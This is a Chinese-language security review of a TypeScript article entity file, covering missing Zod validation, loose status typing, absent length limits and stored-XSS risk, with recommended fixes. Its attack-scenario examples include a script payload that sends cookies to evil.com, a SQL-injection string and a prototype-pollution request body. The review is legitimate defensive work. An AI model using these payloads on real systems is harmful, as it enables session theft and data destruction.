# apis/entity/article.entity.ts — 代码安全专家评审报告

**评审日期**: 2026-05-24
**评审角色**: 代码安全专家（输入验证、注入防护、权限控制、数据完整性、OWASP Top 10）
**文件路径**: `apis/entity/article.entity.ts`
**代码行数**: 63 行
**关联文件**: `apis/controller/article.controller.ts`, `apis/service/impl/article.service.impl.ts`, `prisma/schema.prisma`, `apis/schema/` (同项目其他模块使用 Zod)
**严重级别**: CRITICAL(2) / HIGH(3) / MEDIUM(3) / LOW(1)

---

## 一、安全评价总览

`article.entity.ts` 是文章模块的类型契约层，定义了 5 个接口。从安全视角审视，该文件本身不包含可执行逻辑，但作为**全链路安全防线的第一道关卡**（类型定义），其类型约束的强度直接决定了下游 controller 和 service 的防御深度。

核心安全问题集中在：**类型约束缺失导致防御纵深不足、缺少 Zod Schema 导致运行时验证空白、字段长度未定义导致 DoS 风险、XSS/注入防护依赖下游而非分层防御**。

| 安全维度 | 评分 | 说明 |
|----------|------|------|
| 输入验证 | 2/10 | 无 Zod Schema，Entity 类型约束不完整，运行时验证分散在 controller |
| 注入防护 | 5/10 | 依赖 Prisma 参数化查询，但 Entity 层无贡献；HTML 内容无 XSS 防护 |
| 权限控制 | 4/10 | 状态字段 `string` 类型导致编译期无法拦截非法状态值 |
| 数据完整性 | 3/10 | JSON 字段无结构约束，`skills` 类型与 Schema 不匹配 |
| DoS 防护 | 3/10 | 字符串字段无长度约束（仅 `content` 在 controller 层有 500K 限制） |
| 防御纵深 | 3/10 | 安全逻辑集中在 controller 一层，Entity 层几乎无贡献 |

---

## 二、安全问题清单

### CRITICAL-1: 缺少 Zod Schema 验证，运行时输入校验完全空白

**位置**: 整个文件 + `apis/schema/` 目录缺失 `article.schema.ts`

**问题**: 同项目中 `user.schema.ts` 和 `todo.schema.ts` 均使用 Zod 定义了严格的输入校验 schema，但文章模块**完全没有 Zod Schema**。这意味着：

1. **无运行时类型安全**: TypeScript 接口仅提供编译期提示，运行时 `req.body` 的任何字段都可以是任意类型
2. **验证逻辑散落在 controller**: 当前 controller 用 `typeof content !== 'string'`、`typeof approved !== 'boolean'` 等手工校验，遗漏风险高
3. **违反纵深防御原则**: Entity 层定义了接口契约但无强制力，controller 层的验证是唯一的防线

**攻击场景**:
```bash
# 攻击者可以发送任意类型的字段
curl -X POST /api/projects/1/articles \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"title": {"$gt": ""}, "skills": {"__proto__": {"admin": true}}, "content": 12345}'
```

controller 的 `pickAllowedFields()` 只做字段白名单过滤，不过滤值的类型。恶意构造的 JSON 对象会直接传递到 service 层。

**建议**: 创建 `apis/schema/article.schema.ts`，使用 Zod 定义完整的输入校验：

```typescript
import { z } from 'zod';

export const createArticleSchema = z.object({
  title: z.string().max(500).optional(),
  article_type: z.string().max(50).optional(),
  write_mode: z.string().max(50).optional(),
  keywords: z.string().max(1000).optional(),
  portrait: z.string().max(500).optional(),
  images: z.array(z.string().max(2000)).max(20).optional(),
  platforms: z.array(z.string().max(100)).max(10).optional(),
  skills: z.number().int().positive().optional(),
  llm_model_id: z.number().int().positive().optional(),
  content: z.string().max(500_000).optional(),
  status: z.enum(['draft', 'generating', 'manual_writing']).optional(),
}).strict();  // 拒绝未定义的字段

export const updateArticleSchema = z.object({
  // ... 同上，但 status 允许更多值
  status: z.enum([
    'draft', 'manual_writing', 'generating', 'generate_failed',
    'pending_review', 'publishing', 'publish_failed', 'published'
  ]).optional(),
  scheduled_publish_at: z.string().datetime().nullable().optional(),
}).strict();
```

---

### CRITICAL-2: `UpdateArticleRequest.status` 类型为 `string`，允许任意状态值注入

**位置**: 第 56 行

```typescript
status?: string;  // ← 任意字符串均可通过类型检查
```

**问题**: `UpdateArticleRequest.status` 声明为 `string`，而 `CreateArticleRequest.status` 约束为字面量联合类型 `'draft' | 'generating' | 'manual_writing'`。这种不对称设计在安全层面意味着：

1. **编译期防线缺失**: `update()` 方法的调用者可以传入任意字符串，TypeScript 不会报错
2. **运行时验证依赖 controller 白名单**: 如果绕过 controller（如 service 内部调用、未来新增的 API 端点），非法状态值无拦截
3. **Prisma 枚举是最后防线**: 数据库层会拒绝非法值，但错误信息可能暴露内部实现（信息泄漏）

**攻击场景**:
```bash
# 注入非法状态值，测试后端行为
curl -X PUT /api/projects/1/articles/42 \
  -d '{"status": "admin"}'
```

虽然 controller 的 `STATUS_TRANSITIONS` 白名单会拦截，但攻击者可以尝试绕过白名单的其他路径。

**建议**:

```typescript
// Entity 层定义所有合法状态值
export type ArticleStatus =
  | 'draft' | 'manual_writing' | 'generating' | 'generate_failed'
  | 'pending_review' | 'publishing' | 'publish_failed' | 'published';

export interface UpdateArticleRequest {
  // ...
  status?: ArticleStatus;  // ← 编译期即拦截非法值
}
```

---

### HIGH-1: 字符串字段无长度约束，存在 DoS 和存储滥用风险

**位置**: 第 4-8 行（`title`、`article_type`、`write_mode`、`keywords`、`portrait`），第 9-10 行（`images`、`platforms` 数组元素）

**问题**: 除 `content` 在 controller 层有 500K 字符限制外，其余所有字符串字段在 Entity 类型和 controller 验证中**均无长度上限**：

| 字段 | Entity 约束 | Controller 约束 | 风险 |
|------|------------|----------------|------|
| `title` | `string?` | 无限制 | 可写入数 MB 文本 |
| `keywords` | `string?` | 无限制 | 同上 |
| `portrait` | `string?` | 无限制 | 可写入超长 URL |
| `images` | `string[]?` | 无元素数/长度限制 | 可写入数万个超长 URL |
| `platforms` | `string[]?` | 无元素数/长度限制 | 同上 |
| `content` | `string?` | 500K 字符 | 已限制 |

**攻击场景**:
```bash
# 发送超长 title，占用数据库存储和内存
curl -X POST /api/projects/1/articles \
  -d "{\"title\": \"$(python3 -c 'print("A"*10000000)')\"}"
```

**建议**: 在 Entity 类型中添加 JSDoc 注明约束，并在 Zod Schema 中强制执行：

```typescript
export interface CreateArticleRequest {
  /** @max 500 */
  title?: string;
  /** @max 50 */
  article_type?: string;
  /** @max 1000 */
  keywords?: string;
  /** @max 20 items, each @max 2000 chars */
  images?: string[];
  /** @max 10 items, each @max 100 chars */
  platforms?: string[];
}
```

---

### HIGH-2: `content` 字段无 XSS/HTML 净化声明，存储型 XSS 风险

**位置**: 第 13 行（Article）、第 41 行（CreateArticleRequest）、第 55 行（UpdateArticleRequest）

```typescript
content: string | null;  // ← 可能包含任意 HTML/JS 代码
```

**问题**: `content` 是文章正文，最大 500K 字符。controller 层只做了长度检查，**未做任何 HTML 净化**。如果前端直接渲染（如 `dangerouslySetInnerHTML` 或 `v-html`），攻击者可以注入恶意脚本：

**攻击场景**:
```bash
# 存储型 XSS：在文章内容中注入恶意脚本
curl -X POST /api/projects/1/articles \
  -d '{"content": "<script>fetch(\"https://evil.com/steal?cookie=\"+document.cookie)</script>", "status": "draft"}'
```

当前前端可能使用文本渲染（`textContent`）而非 HTML 渲染，但 **Entity 类型未声明内容的安全属性**，未来的开发者无法从类型定义中判断 content 是纯文本还是富文本。

**建议**:

1. 在 Entity 中明确声明内容类型：
```typescript
/** 文章正文（纯文本，禁止 HTML） */
content: string | null;

// 或如果支持富文本：
/** 文章正文（已净化的安全 HTML） */
content: string | null;
```

2. 在 Zod Schema 或 controller 中添加净化：
```typescript
import DOMPurify from 'isomorphic-dompurify';

content: z.string().max(500_000).transform(s => DOMPurify.sanitize(s)).optional(),
```

---

### HIGH-3: `scheduled_publish_at` 接受 `string | null` 但未约束日期格式

**位置**: 第 57 行

```typescript
scheduled_publish_at?: string | null;
```

**问题**: 此字段接受任意字符串，未在 Entity 层或 controller 层验证是否为合法的 ISO 8601 日期格式。安全问题：

1. **时区操纵**: 攻击者可以发送过去的时间触发立即发布，绕过审核流程
2. **格式歧义**: 不同格式的日期字符串可能导致解析不一致
3. **数据库错误**: Prisma 的 `DateTime?` 会拒绝非法字符串，但错误信息可能泄漏堆栈

**攻击场景**:
```bash
# 发送过去的时间，尝试触发立即发布
curl -X PUT /api/projects/1/articles/42 \
  -d '{"scheduled_publish_at": "2020-01-01T00:00:00Z"}'

# 发送非法格式，测试错误处理
curl -X PUT /api/projects/1/articles/42 \
  -d '{"scheduled_publish_at": "'; DROP TABLE articles;--"}'
```

**建议**:
```typescript
// Zod Schema 中使用严格日期验证
scheduled_publish_at: z.string()
  .datetime({ offset: true })  // 强制 ISO 8601
  .refine(d => new Date(d) > new Date(), "发布时间必须在未来")
  .nullable()
  .optional(),
```

---

### MEDIUM-1: `images` 和 `platforms` JSON 数组无元素约束，可能被滥用

**位置**: 第 9-10 行

```typescript
images: string[] | null;
platforms: string[] | null;
```

**问题**: 这两个字段在 Prisma 中是 `Json?` 类型，Entity 声明为 `string[] | null`，但：

1. **无数组长度限制**: 攻击者可以写入数万个元素
2. **无元素内容限制**: 每个字符串元素可以是任意长度
3. **Prisma 不验证 JSON 结构**: 数据库层面会接受任何合法 JSON

**建议**: 在 Zod Schema 中限制：
```typescript
images: z.array(z.string().max(2000)).max(20).optional(),
platforms: z.array(z.string().max(100)).max(10).optional(),
```

---

### MEDIUM-2: `Article` 接口暴露 `created_by`，存在用户 ID 枚举风险

**位置**: 第 17 行

```typescript
created_by: number | null;
```

**问题**: `created_by` 是用户 ID，会通过 service 层的 `mapArticleToResponse()` 返回给前端。如果前端展示此字段（如"创建者"），攻击者可以通过遍历文章 API 枚举系统中的用户 ID。

虽然当前的 API 需要认证，但在权限模型下 `view` 角色的用户也能访问文章列表，扩大了信息暴露面。

**建议**: 评估是否需要返回 `created_by`，或在响应 DTO 中脱敏：
```typescript
// 方案 1：响应中不包含 created_by
// 方案 2：返回 created_by_username 替代原始 ID
```

---

### MEDIUM-3: `ReviewArticleRequest` 缺少审计追踪字段

**位置**: 第 60-62 行

```typescript
export interface ReviewArticleRequest {
  approved: boolean;
}
```

**问题**: 审核是高敏感操作（决定文章是否发布），当前接口仅接受 `approved: boolean`，缺少：

1. **拒绝原因**: 审核拒绝时应强制填写原因（可追溯）
2. **审核时间戳**: Entity 应记录审核时间
3. **审核者信息**: 虽然 controller 从 JWT 获取，但 Entity 未表达此关系

从安全审计角度，关键操作应有完整的审计追踪。

**建议**:
```typescript
export interface ReviewArticleRequest {
  approved: boolean;
  reason?: string;  // 拒绝时建议必填
}
```

---

### LOW-1: `llm_model_id` 和 `skills` 为 `number` 类型，但未约束为正整数

**位置**: 第 11-12 行

```typescript
skills: number | null;
llm_model_id: number | null;
```

**问题**: 这些字段应该是正整数（外键/ID），但 TypeScript 的 `number` 类型允许负数、零和浮点数。虽然 Prisma 的 `Int?` 会最终拦截，但中间层的类型约束可以更早发现问题。

**建议**: 在 Zod Schema 中使用 `z.number().int().positive()`。

---

## 三、安全威胁模型（STRIDE 分析）

| 威胁类型 | 风险 | 当前防护 | 缺口 |
|----------|------|----------|------|
| **Spoofing（欺骗）** | 低 | JWT 认证 | 不涉及 Entity 层 |
| **Tampering（篡改）** | **高** | Controller 字段白名单 | 无 Zod Schema，`status` 为 `string` |
| **Repudiation（抵赖）** | **中** | 无 | 审核操作无审计追踪 |
| **Info Disclosure（信息泄漏）** | **中** | Prisma 参数化查询 | `created_by` 暴露用户 ID |
| **DoS（拒绝服务）** | **高** | `content` 500K 限制 | 其他字段无长度限制 |
| **Elevation of Privilege（提权）** | **中** | 状态转换白名单 | `UpdateArticleRequest.status` 为 `string` |

---

## 四、安全改进优先级

### P0 — 立即修复（阻断已知攻击路径）

| 措施 | 工作量 | 阻断的攻击 |
|------|--------|-----------|
| 创建 `article.schema.ts` Zod Schema | 中 | 所有类型混淆攻击、超长输入 DoS |
| `UpdateArticleRequest.status` 改为枚举类型 | 低 | 非法状态值注入 |
| 所有字符串字段添加长度上限 | 低 | 存储 DoS |

### P1 — 短期修复（1 周内）

| 措施 | 工作量 | 阻断的攻击 |
|------|--------|-----------|
| `content` 字段添加 HTML 净化或明确安全声明 | 中 | 存储型 XSS |
| `scheduled_publish_at` 添加日期格式和未来时间校验 | 低 | 时间操纵 |
| JSON 数组字段添加元素数量和长度约束 | 低 | JSON 炸弹 |

### P2 — 中期改进

| 措施 | 工作量 | 阻断的攻击 |
|------|--------|-----------|
| 审核接口添加拒绝原因字段 | 低 | 审计追踪缺口 |
| 响应 DTO 脱敏 `created_by` | 低 | 用户 ID 枚举 |
| 外键字段使用 `z.number().int().positive()` | 低 | 非法 ID 值 |

---

## 五、与同项目其他模块的安全对比

| 安全特性 | User 模块 | Todo 模块 | Article 模块 |
|----------|-----------|-----------|-------------|
| Zod Schema | ✅ `user.schema.ts` | ✅ `todo.schema.ts` | ❌ **缺失** |
| 字段白名单 | ✅ | ✅ | ✅ controller 层 |
| 长度限制 | ✅ | ✅ | ⚠️ 仅 `content` |
| 类型严格性 | ✅ | ✅ | ❌ `status` 为 `string` |
| XSS 防护 | N/A | N/A | ❌ 无 HTML 净化 |

Article 模块是同项目中安全验证最薄弱的模块，建议对齐 User 和 Todo 模块的安全标准。

---

## 六、总结

`article.entity.ts` 作为类型定义文件，本身不包含可执行逻辑，但其**类型约束的松散直接削弱了整个安全链**。最关键的问题是**缺少 Zod Schema 验证**（同项目其他模块都有）和**`UpdateArticleRequest.status` 使用 `string` 类型**。

从安全防御纵深的角度，当前的安全验证几乎完全依赖 controller 层的手工检查，违反了"每一层都应该独立防御"的原则。一旦 controller 出现遗漏（如新增 API 端点忘记调用白名单），Entity 层的类型松散将使攻击者畅通无阻。

**综合安全评分: 3.5/10**

**建议**: 优先级 P0 的三个措施（Zod Schema、status 枚举化、字符串长度限制）应在下一次迭代中完成，预计工作量 2-3 小时，可将安全评分提升至 6/10 以上。
